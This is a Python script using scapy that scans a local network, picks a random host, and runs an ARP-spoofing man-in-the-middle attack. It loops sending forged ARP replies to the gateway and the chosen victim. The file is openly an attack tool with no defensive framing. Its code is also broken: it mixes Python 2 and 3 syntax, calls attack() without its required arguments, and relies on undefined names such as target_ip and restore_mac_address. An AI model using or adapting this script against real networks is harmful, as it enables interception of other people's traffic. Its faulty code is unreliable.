import os
import re
import socket
import struct
from scapy.all import *
import random
import time

interfaces = ['en0', 'en1']
clients = []
original_macs = {}

def get_subnet_mask(mask):
    # Convert the mask to an integer
    mask_int = int(mask, 16)

    # Convert the mask to dotted decimal format
    mask_dotted = socket.inet_ntoa(struct.pack('>I', mask_int))

    return mask_dotted

def scan_network(gateway, subnet):

    # Convert subnet mask to CIDR notation
    cidr = sum(bin(int(x)).count('1') for x in subnet.split('.'))
    ip_range = '{}{}'.format(gateway, '/{}'.format(cidr))

    arp = ARP(pdst=ip_range)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp

    result = srp(packet, timeout=2, verbose=0)[0]

    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

def target_selection():
    global clients, original_macs

    # Get the MAC address of the default gateway
    gateway_mac = next((client['mac'] for client in clients if client['ip'] == gateway_ip), None)
    if gateway_mac is None:
        print 'Could not find gateway MAC address'
        return

    print 'Gateway MAC address: {}'.format(gateway_mac)

    # Choose a random client to attack
    candidates = [client for client in clients if client['mac'] != gateway_mac]
    if not candidates:
        print 'No other Clients found'
        return

    target = random.choice(candidates)

    print 'Target IP address: {}'.format(target['ip'])
    print 'Target MAC address: {}'.format(target['mac'])

    # Store the original MAC addresses
    original_macs['gateway'] = gateway_mac
    original_macs['target'] = target['mac']

def attack(target_mac, gateway_ip, iface):
    print("Starting ARP spoof attack...")
    try:
        while True:
            # Tell the gateway that the MAC address of the target is the MAC address of the local interface
            send(ARP(op=2, pdst=gateway_ip, hwdst=target_mac, psrc=target_ip, hwsrc=local_mac), iface=iface, verbose=False)

            # Tell the target that the MAC address of the gateway is the MAC address of the local interface
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=local_mac), iface=iface, verbose=False)

            # Print a message to indicate that the attack is still running
            print("Doing something...")

            # Sleep for a short time to avoid overwhelming the network
            time.sleep(1)

    except KeyboardInterrupt:
        # If the user interrupts the attack, restore the original MAC addresses
        print("Attack interrupted, restoring original MAC addresses...")
        restore_mac_address(iface, local_mac, original_mac[iface])
        restore_mac_address(gateway_ip, target_mac, original_mac[gateway_ip])

    except:
        print("Error during ARP spoof attack, restoring original MAC addresses...")
        restore_mac_address(iface, local_mac, original_mac[iface])
        restore_mac_address(gateway_ip, target_mac, original_mac[gateway_ip])
        
for iface in interfaces:
    # Get local IP, MAC address, and subnet mask for the current interface
    output = os.popen('ifconfig %s' % iface).read()
    local_ip_match = re.search('inet (.*?)\s', output)
    local_mac_match = re.search('ether (.*?)\s', output)
    subnet_mask_match = re.search('netmask (.*?)\s', output)

    if local_ip_match:
        local_ip = local_ip_match.group(1)
        local_mac = local_mac_match.group(1)
        subnet_mask = subnet_mask_match.group(1)

        # Get default gateway IP address
        output = os.popen('netstat -rn').read()
        gateway_ip_match = re.search('default\s+(.*?)\s', output)

        if gateway_ip_match:
            gateway_ip = gateway_ip_match.group(1)

            print("Interface: %s" % iface)
            print("Local IP address: %s" % local_ip)
            print("Local MAC address: %s" % local_mac)
            print("Subnet mask: %s" % get_subnet_mask(subnet_mask))
            print("Gateway IP address: %s" % gateway_ip)
            print("\n")

            # Perform ARP scan to get IP and MAC addresses of devices on the network

            scan_network(gateway_ip, get_subnet_mask(subnet_mask))

            target_selection()
            attack()
